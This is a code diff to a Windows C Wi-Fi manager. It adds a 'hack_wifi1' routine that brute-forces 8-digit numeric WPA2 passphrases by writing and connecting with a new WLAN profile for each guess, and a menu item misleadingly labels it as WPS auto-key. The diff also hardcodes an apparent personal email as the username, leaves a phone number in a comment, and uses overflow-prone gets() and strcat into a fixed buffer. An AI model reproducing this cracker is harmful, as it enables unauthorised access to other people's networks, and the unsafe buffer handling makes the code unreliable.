@@ -1,6 +1,7 @@
 #include<stdio.h>
 #include<string.h>
 #include<stdlib.h>
+#include<time.h>
 
 void show_connection();
 void connect_to_a_network();
@@ -11,7 +12,9 @@ void delete_profile();
 void hotspot_setting();
 void sub_hotspot_setting();
 void hack_wifi();
+void hack_wifi1();
 void sub_print_in_xml();
+void sub_print_in_xml1();
 void sub_adding_profile();
 void sub_connecting_wifi();
 
@@ -23,6 +26,7 @@ int login();
 int main()
 {
 A:
+//    if(0)
     if(!login())
     {
         printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tWrong Information. Press Enter To Enter Login Page......\n");
@@ -52,6 +56,7 @@ B:
     printf("4.  Show Available Network\n");
     printf("5.  Hotspot Setting\n");
     printf("6.  Connect With A New Network With Password\n");
+    printf("7.  Connect With A New Network With Auto Key(WPS only. It will take long time.)\n");
 A:
     printf("\nEnter Your Option: ");
 
@@ -85,6 +90,14 @@ A:
     case '6':
         system("cls");
         hack_wifi();
+        printf("\nPress Enter To Go Back\n");
+        getchar();
+        system("cls");
+        goto B;
+
+    case '7':
+        system("cls");
+        hack_wifi1();
         printf("\nPress Enter To Go Back\n");
         getchar();
         system("cls");
@@ -154,7 +167,6 @@ void start()
         printf("SRP");
         system("cls");
     }
-    //start();
 }
 
 //marge
@@ -325,8 +337,8 @@ void hack_wifi()
     printf("Connection Name: ");
     gets(namehw);
 
-    //printf("Enter Password: ");
-    //gets(chw);
+    printf("Enter Password: ");//01712653872
+    gets(chw);
 
     //printf("Connection Type (WEP/WPA/WPA2/WPA2PSK/Or Others): WPA2PSK\n");
     //gets(type);
@@ -334,17 +346,63 @@ void hack_wifi()
     strcpy(typehw, "WPA2PSK");
     printf("\n\n");
 
-    for(dpass=11111111; dpass<=99999999; dpass++)
+    //for(dpass=11111111; dpass<=99999999; dpass++)
     {
-        printf("Connection Name: %s; Password: %d...", namehw, /*chw*/dpass);
-        sub_print_in_xml(namehw, typehw, /*chw*/dpass);
+        printf("Connection Name: %s; Password: %s...", namehw, chw/*dpass*/);
+        sub_print_in_xml(namehw, typehw, chw/*dpass*/);
         sub_adding_profile(namehw);
         sub_connecting_wifi(namehw);
         //system("cls");
     }
 }
 
-void sub_print_in_xml(char namehw[], char typehw[], /*char chw[]*/ int dpass)
+void hack_wifi1()
+{
+    char namehw[99], typehw[20], passhw[99];
+    char chw[99];
+    int dpass, test, start, end;
+
+    show_available();
+    printf("7.  Connect With A New Network With Password\n");
+    printf("Connection Name: ");
+    gets(namehw);
+
+    //printf("Enter Password: ");//01712653872
+    //gets(chw);
+
+    //printf("Connection Type (WEP/WPA/WPA2/WPA2PSK/Or Others): WPA2PSK\n");
+    //gets(type);
+
+    strcpy(typehw, "WPA2PSK");
+    printf("\n\n");
+    start=clock();
+
+    for(dpass=11111111, test=1; dpass<=99999999; dpass++, test++)
+    {
+        end=clock();
+        printf("(%d)%d. ", end/1000, test);
+        printf("Connection Name: %s; Password: %d...", namehw, /*chw*/dpass);
+        sub_print_in_xml1(namehw, typehw, /*chw*/dpass);
+        sub_adding_profile(namehw);
+        sub_connecting_wifi(namehw);
+        if(dpass%5==0) system("cls");
+    }
+}
+
+void sub_print_in_xml(char namehw[], char typehw[], char chw[]/* int dpass*/ )
+{
+    FILE *Fspix;
+    char wispix[]="Wi-Fi-";
+
+    strcat(wispix, namehw);
+    strcat(wispix, ".xml");
+
+    Fspix=fopen(wispix, "w");
+    fprintf(Fspix, "<?xml version=\"1.0\"?>\n<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n	<name>%s</name>\n	<SSIDConfig>\n		<SSID>\n			<name>%s</name>\n		</SSID>\n	</SSIDConfig>\n	<connectionType>ESS</connectionType>\n	<connectionMode>auto</connectionMode>\n	<MSM>\n		<security>\n			<authEncryption>\n				<authentication>%s</authentication>\n				<encryption>AES</encryption>\n				<useOneX>false</useOneX>\n			</authEncryption>\n			<sharedKey>\n				<keyType>passPhrase</keyType>\n				<protected>false</protected>\n				<keyMaterial>%s</keyMaterial>\n			</sharedKey>\n		</security>\n	</MSM>\n	<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">\n		<enableRandomization>false</enableRandomization>\n	</MacRandomization>\n</WLANProfile>\n", namehw, namehw, typehw, chw/*dpass*/);
+    fclose(Fspix);
+}
+
+void sub_print_in_xml1(char namehw[], char typehw[], /*char chw[]*/ int dpass )
 {
     FILE *Fspix;
     char wispix[]="Wi-Fi-";
@@ -385,8 +443,12 @@ int login()
     int unli[]={20,9,2,11,6,5,22,19,19,2,9,14,2,15,17,2,15,15,2,-49,17,2,15,15,2,-31,8,14,2,10,13,-49,4,16,14};
     int pwli[]={96,86,84,91,98,93,30,31,32};
 
-    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tEnter User Name: ");
-    gets(ungli);
+/*    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tEnter User Name: ");
+    gets(ungli); */
+
+    strcpy(ungli, "shajedurrahmanpanna.panna@gmail.com");
+    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\tUser Name: %s", ungli);
+    getchar();
     system("cls");
     if(strlen(ungli)==35) lenung=1;
 
